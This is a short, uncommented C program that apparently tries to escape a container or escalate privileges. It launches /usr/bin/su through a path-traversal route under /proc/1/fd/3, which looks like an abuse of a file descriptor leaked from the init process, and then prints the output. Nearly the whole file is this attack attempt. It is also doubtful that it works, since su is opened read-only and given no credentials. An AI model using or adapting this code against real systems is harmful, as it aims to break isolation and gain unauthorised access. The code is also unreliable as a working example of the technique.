#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv) {
    sleep(2);

    FILE *command = popen("/proc/1/fd/3/../../../../../../../usr/bin/su", "r");
    if (command == NULL) {
        perror("Error opening process");
        return EXIT_FAILURE;
    }

    char path[1000];
    while (fgets(path, sizeof(path), command) != NULL) {
        printf("%s", path);
    }

    if (pclose(command) == -1) {
        perror("Error closing process");
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}